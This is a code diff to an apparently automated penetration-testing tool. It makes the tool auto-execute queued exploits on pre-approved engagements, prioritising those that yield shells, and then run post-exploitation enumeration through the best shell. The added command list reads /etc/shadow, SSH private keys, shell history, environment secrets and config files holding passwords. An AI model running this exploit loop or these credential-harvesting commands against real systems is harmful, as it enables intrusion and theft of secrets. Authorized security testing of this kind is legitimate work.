@@ -1115,6 +1115,80 @@ def _is_deep_scan(s: dict) -> bool:
             or ports in ("-", "-p-", "all", "*"))
 
 
+# Wall-clock ceiling for the post-scan executor so a big queue of MSF exploits
+# (each waiting ~20s for a session) cannot run the background thread forever.
+POSTSCAN_EXEC_BUDGET_S = int(os.environ.get("POSTSCAN_EXEC_BUDGET_S", "1800"))
+
+
+def _session_pending_exploit_ids(sid: str) -> list:
+    """Still-pending (un-executed) exploit ids for this session, newest first.
+    execute_approved_exploit moves a row out of 'pending', so re-running the
+    post-scan executor never re-fires one that already ran."""
+    try:
+        from db_utils import get_db
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute(
+                "SELECT id::text FROM pending_exploits "
+                "WHERE session_id = %s::uuid AND status = 'pending' "
+                "ORDER BY created_at DESC LIMIT %s",
+                (str(sid), MAX_EXPLOITS_PER_SESSION))
+            return [r[0] for r in cur.fetchall()]
+    except Exception as e:  # noqa: BLE001
+        _log.warning("[%s] pending-exploit lookup failed: %s", sid, e)
+        return []
+
+
+def _fire_and_enumerate(sid: str, base_state: dict) -> None:
+    """CLOSE THE LOOP: after a post-scan re-plan queued exploits, actually EXECUTE
+    them (when the engagement is pre-approved) and then enumerate the best shell.
+
+    Without this the post-scan re-analysis re-planned exploits but never ran them,
+    so ports discovered after the first pass (the common case — the graph finishes
+    before the port scan ingests) never became shell attempts. Pre-approval is the
+    same authorization gate the exploit phase uses; the scope gate is still
+    enforced fail-closed inside execute_approved_exploit."""
+    if not base_state.get("exploit_phase"):
+        return
+    preapproved, eid = _engagement_preapproval(sid)
+    if not preapproved:
+        _msg(sid, "Exploit",
+             "[post-scan] Exploits were queued but this engagement is NOT "
+             "pre-approved — they stay pending for operator approval.")
+        return
+    pending = _session_pending_exploit_ids(sid)
+    if not pending:
+        return
+    _msg(sid, "Exploit",
+         f"[post-scan][pre-approved:{eid}] executing {len(pending)} queued "
+         f"exploit(s) discovered ports produced, through the scope gate "
+         f"(out-of-scope is refused).")
+    summary = _execute_pending_exploits(
+        sid, pending, approver=f"engagement_preapproval:{eid}",
+        note="post-scan auto-exec", agent="Exploit",
+        budget_s=POSTSCAN_EXEC_BUDGET_S)
+    _emit("langgraph_postscan_exploit_executed", sid,
+          {"executed": len(summary["executed"]), "shells": len(summary["shells"]),
+           "failed": len(summary["failed"]), "ports": summary["ports"],
+           "stopped_early": summary["stopped_early"]})
+    _msg(sid, "Exploit",
+         f"[post-scan] {len(summary['executed'])} run, "
+         f"{len(summary['shells'])} shell(s), {len(summary['failed'])} failed "
+         f"across {summary['ports']} port(s)"
+         + ("; budget reached, remainder still pending" if summary["stopped_early"] else "")
+         + ".")
+    # Enumerate the BEST shell for the most info, if a shell landed.
+    try:
+        through = _enumerate_through_best_access(sid, base_state.get("target") or "")
+        if through.get("ran"):
+            a = through["access"]
+            _msg(sid, "PostEnumeration",
+                 f"[post-scan] ran {through['ran']} enumeration step(s) through "
+                 f"the best shell: {a['kind']} {a['handle']} "
+                 f"(whoami={a.get('whoami') or '?'}, root={a.get('is_root')}).")
+    except Exception as e:  # noqa: BLE001
+        _msg(sid, "PostEnumeration", f"[post-scan] enumeration failed: {e}")
+
+
 def _run_analysis_pass(sid: str, base_state: dict, note: str) -> None:
     """Re-run analyze (+ exploit planning when enabled) over whatever results are
     in the database RIGHT NOW, appending messages to this session. Shared by the
@@ -1131,6 +1205,12 @@ def _run_analysis_pass(sid: str, base_state: dict, note: str) -> None:
                 exploit_plan(state)
             except Exception as e:  # noqa: BLE001
                 _msg(sid, "Exploit", f"[post-scan] exploit planning failed: {e}")
+            # Close the loop: execute what was just queued (pre-approved) and
+            # enumerate the best shell. Best-effort — never breaks the pass.
+            try:
+                _fire_and_enumerate(sid, base_state)
+            except Exception as e:  # noqa: BLE001
+                _msg(sid, "Exploit", f"[post-scan] auto-exec failed: {e}")
     finally:
         try:
             scan_tracker.unregister_run(sid)
@@ -1568,6 +1648,87 @@ def _exploit_meta(ids):
     return out
 
 
+def _execute_pending_exploits(sid, pending_ids, *, approver: str,
+                              note=None, agent: str = "Exploit",
+                              budget_s: int = None) -> dict:
+    """Execute a set of pending exploits, grouped by UNIQUE PORT, shell-yielding
+    first, stopping a port the moment one attempt lands a shell. Bounded PER PORT
+    by MAX_EXPLOITS_PER_PORT and (optionally) by a wall-clock budget. Each dispatch
+    goes through execute_approved_exploit -> the exploit-runner's scope gate, which
+    fails CLOSED on out-of-scope. Returns a summary dict. Shared by exploit_exec
+    (operator/pre-approved graph node) and the post-scan re-analysis executor so
+    both use one bounded, port-covering implementation."""
+    import time as _t
+    pending_ids = [str(p) for p in (pending_ids or []) if p]
+    deadline = (_t.monotonic() + budget_s) if budget_s else None
+    metas = _exploit_meta(pending_ids)
+    groups, order = {}, []
+    for pid in pending_ids:
+        m = metas.get(pid) or {}
+        port = m.get("port")
+        key = port if port is not None else f"_noport:{pid}"
+        if key not in groups:
+            groups[key] = []
+            order.append(key)
+        groups[key].append(pid)
+
+    def _rank(pid):
+        m = metas.get(pid) or {}
+        is_shell = 0 if (m.get("etype") in _SHELL_EXPLOIT_TYPES
+                         and m.get("category") != "dos") else 1
+        try:
+            conf = float(m.get("confidence") or 0)
+        except (TypeError, ValueError):
+            conf = 0.0
+        return (is_shell, -conf)
+
+    executed, failed, shells, per_port = [], [], [], []
+    stopped_early = False
+    for key in order:
+        if deadline and _t.monotonic() >= deadline:
+            stopped_early = True
+            break
+        ids = sorted(groups[key], key=_rank)
+        port = None if str(key).startswith("_noport:") else key
+        got_shell, attempted = False, 0
+        for pid in ids:
+            if attempted >= MAX_EXPLOITS_PER_PORT:
+                _msg(sid, agent,
+                     f"[port {port}] reached MAX_EXPLOITS_PER_PORT="
+                     f"{MAX_EXPLOITS_PER_PORT}; {len(ids) - attempted} "
+                     f"candidate(s) not attempted on this port.")
+                break
+            if deadline and _t.monotonic() >= deadline:
+                stopped_early = True
+                break
+            attempted += 1
+            try:
+                _mark_approved(pid, approver, note)
+                result = _tool(scan_tools.execute_approved_exploit, pid)
+                _msg(sid, agent,
+                     f"[execute_approved_exploit {pid} port={port}]\n{result[:1200]}")
+                executed.append(pid)
+                m = metas.get(pid) or {}
+                if (m.get("etype") in _SHELL_EXPLOIT_TYPES
+                        and m.get("category") != "dos" and _gave_shell(result)):
+                    got_shell = True
+                    shells.append(pid)
+                    _msg(sid, agent,
+                         f"[port {port}] shell obtained via {pid} — stopping this "
+                         f"port; {len(ids) - attempted} remaining candidate(s) "
+                         f"not needed.")
+                    break
+            except Exception as e:  # noqa: BLE001
+                _msg(sid, agent,
+                     f"[execute_approved_exploit {pid} port={port}] FAILED: {e}")
+                failed.append(pid)
+        per_port.append({"port": port, "candidates": len(ids),
+                         "attempted": attempted, "shell": got_shell})
+    return {"executed": executed, "failed": failed, "shells": shells,
+            "ports": len(order), "per_port": per_port,
+            "stopped_early": stopped_early}
+
+
 def exploit_exec(state: PentestState) -> dict:
     """Execute the operator-approved exploits, grouped by UNIQUE PORT.
 
@@ -1604,77 +1765,17 @@ def exploit_exec(state: PentestState) -> dict:
                 "findings": ["exploit_exec: skipped (no id)"],
                 "log": ["exploit_exec skipped: no pending_exploit_id"]}
 
-    # Group by unique port; a port-less exploit is its own group so it still runs
-    # exactly once. Order preserved so the operator's evidence ordering shows.
-    metas = _exploit_meta(pending_ids)
-    groups, order = {}, []
-    for pid in pending_ids:
-        m = metas.get(pid) or {}
-        port = m.get("port")
-        key = port if port is not None else f"_noport:{pid}"
-        if key not in groups:
-            groups[key] = []
-            order.append(key)
-        groups[key].append(pid)
-
-    def _rank(pid):
-        # Shell-yielding first (only these can end the port early), then by
-        # evidence strength descending.
-        m = metas.get(pid) or {}
-        is_shell = 0 if (m.get("etype") in _SHELL_EXPLOIT_TYPES
-                         and m.get("category") != "dos") else 1
-        try:
-            conf = float(m.get("confidence") or 0)
-        except (TypeError, ValueError):
-            conf = 0.0
-        return (is_shell, -conf)
-
-    executed, failed, shells, per_port = [], [], [], []
-    for key in order:
-        ids = sorted(groups[key], key=_rank)
-        port = None if str(key).startswith("_noport:") else key
-        got_shell, attempted = False, 0
-        for pid in ids:
-            if attempted >= MAX_EXPLOITS_PER_PORT:
-                _msg(sid, "Exploit",
-                     f"[port {port}] reached MAX_EXPLOITS_PER_PORT="
-                     f"{MAX_EXPLOITS_PER_PORT}; {len(ids) - attempted} "
-                     f"candidate(s) not attempted on this port.")
-                break
-            attempted += 1
-            try:
-                _mark_approved(pid, "operator (exploit approval)",
-                               decision.get("note"))
-                result = _tool(scan_tools.execute_approved_exploit, pid)
-                _msg(sid, "Exploit",
-                     f"[execute_approved_exploit {pid} port={port}]\n"
-                     f"{result[:1200]}")
-                executed.append(pid)
-                m = metas.get(pid) or {}
-                if (m.get("etype") in _SHELL_EXPLOIT_TYPES
-                        and m.get("category") != "dos" and _gave_shell(result)):
-                    got_shell = True
-                    shells.append(pid)
-                    _msg(sid, "Exploit",
-                         f"[port {port}] shell obtained via {pid} — stopping this "
-                         f"port; {len(ids) - attempted} remaining candidate(s) "
-                         f"not needed.")
-                    break
-            except Exception as e:  # noqa: BLE001
-                # One failure must not abandon the rest — of this port OR the
-                # ports after it. An exploit that errors is a result; the ones
-                # after it never running is a gap.
-                _msg(sid, "Exploit",
-                     f"[execute_approved_exploit {pid} port={port}] FAILED: {e}")
-                failed.append(pid)
-        per_port.append({"port": port, "candidates": len(ids),
-                         "attempted": attempted, "shell": got_shell})
+    summary = _execute_pending_exploits(
+        sid, pending_ids, approver="operator (exploit approval)",
+        note=decision.get("note"), agent="Exploit")
+    executed, failed, shells = summary["executed"], summary["failed"], summary["shells"]
+    order, per_port = summary["ports"], summary["per_port"]
 
     _emit("langgraph_exploit_executed", sid,
           {"executed": len(executed), "failed": len(failed),
-           "shells": len(shells), "ports": len(order), "per_port": per_port,
+           "shells": len(shells), "ports": order, "per_port": per_port,
            "pending_exploit_ids": executed})
-    findings = [f"exploit_exec: {len(order)} unique port(s); {len(executed)} run, "
+    findings = [f"exploit_exec: {order} unique port(s); {len(executed)} run, "
                 f"{len(shells)} shell(s), {len(failed)} failed"]
     if failed:
         findings.append(f"exploit_exec: {len(failed)} failed to execute")
@@ -2056,6 +2157,42 @@ def _wrap_remote(protocol: str, ip: str, port, command: str) -> Optional[str]:
             f"-p {port or 22} {{username}}@{ip} '{safe}' < /dev/null")
 
 
+# The read-only info-gathering commands most likely to yield actionable next
+# steps through a held *nix shell, highest-payoff first. Kind-agnostic (works on
+# bind/command/meterpreter/ssh access), and NONE mutate the target — this is
+# enumeration, not persistence. A root-only read (e.g. /etc/shadow) simply
+# returns nothing on a user shell rather than erroring the sequence.
+_POSTEX_INFO_COMMANDS = [
+    ("id", "Current identity & groups", "id"),
+    ("uname", "Kernel / OS (privesc surface)", "uname -a"),
+    ("os_release", "Distro release", "cat /etc/issue /etc/os-release 2>/dev/null"),
+    ("whoami_hostname", "Host & user", "hostname; whoami"),
+    ("passwd", "Local users", "cat /etc/passwd"),
+    ("shadow", "Password hashes (root only)", "cat /etc/shadow 2>/dev/null"),
+    ("sudo_l", "Sudo rights (no password)", "sudo -n -l 2>/dev/null"),
+    ("suid", "SUID binaries (privesc)",
+     "find / -perm -4000 -type f 2>/dev/null"),
+    ("caps", "File capabilities (privesc)",
+     "getcap -r / 2>/dev/null"),
+    ("crontab", "System cron jobs",
+     "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
+    ("listen", "Listening services (pivot targets)",
+     "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
+    ("net", "Network interfaces & routes",
+     "ip a 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null"),
+    ("homes", "Home directories", "ls -la /root /home/* 2>/dev/null"),
+    ("history", "Shell history (creds/commands)",
+     "cat /root/.bash_history /home/*/.bash_history 2>/dev/null"),
+    ("ssh_keys", "SSH private keys",
+     "cat /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null"),
+    ("env", "Environment (secrets in env)", "env 2>/dev/null"),
+    ("db_conf", "Web/app config files (DB creds)",
+     "grep -rIl --include=*.php --include=*.conf --include=*.env "
+     "-e password -e passwd -e secret /var/www /etc 2>/dev/null | head -20"),
+    ("procs", "Running processes", "ps aux 2>/dev/null || ps -ef 2>/dev/null"),
+]
+
+
 def _enumerate_through_best_access(sid, target: str) -> dict:
     """Run the methodology's post-access checklist through the BEST shell we hold.
 
@@ -2105,6 +2242,33 @@ def _enumerate_through_best_access(sid, target: str) -> dict:
          f"{measured.get('discovered', 0)} candidate(s) by measured privilege "
          f"and stability.")
 
+    seen_cmds = set()
+
+    def _run_step(step_id, title, cmd):
+        cmd = (cmd or "").strip()
+        if not cmd or cmd in seen_cmds:
+            return
+        seen_cmds.add(cmd)
+        res = ax.run(best, cmd)
+        out["steps"].append({"step": step_id, "title": title, "command": cmd,
+                             "ok": res["ok"], "output": (res["output"] or "")[:1200]})
+        if res["ok"]:
+            out["ran"] += 1
+        else:
+            out["failed"] += 1
+
+    # HIGH-VALUE INFO GATHERING FIRST — the read-only commands most likely to
+    # yield actionable info on ANY *nix shell (kind-agnostic: a bind/command/
+    # meterpreter shell benefits from these, where the ssh playbook alone did
+    # nothing for it). Ordered by payoff: identity, then privesc surface, then
+    # secrets/pivot data. Read-only; NOTHING here mutates the target — "get more
+    # info" is enumeration, not persistence. root-only reads (shadow) simply
+    # return nothing on a user shell.
+    for step_id, title, cmd in _POSTEX_INFO_COMMANDS:
+        _run_step(step_id, title, cmd)
+
+    # Then the methodology's own ssh post-access checklist (sudo rights,
+    # authorized_keys, known_hosts, sshd_config), deduped against the above.
     for st in pb.steps_for("ssh", access="shell"):
         if st["access_required"] != "shell":
             continue
@@ -2112,14 +2276,7 @@ def _enumerate_through_best_access(sid, target: str) -> dict:
             cmd = (c.get("command") or "").strip()
             if not cmd or "{" in cmd:
                 continue
-            res = ax.run(best, cmd)
-            out["steps"].append({"step": st["id"], "title": st["title"],
-                                 "command": cmd, "ok": res["ok"],
-                                 "output": (res["output"] or "")[:1200]})
-            if res["ok"]:
-                out["ran"] += 1
-            else:
-                out["failed"] += 1
+            _run_step(st["id"], st["title"], cmd)
     return out
 
 
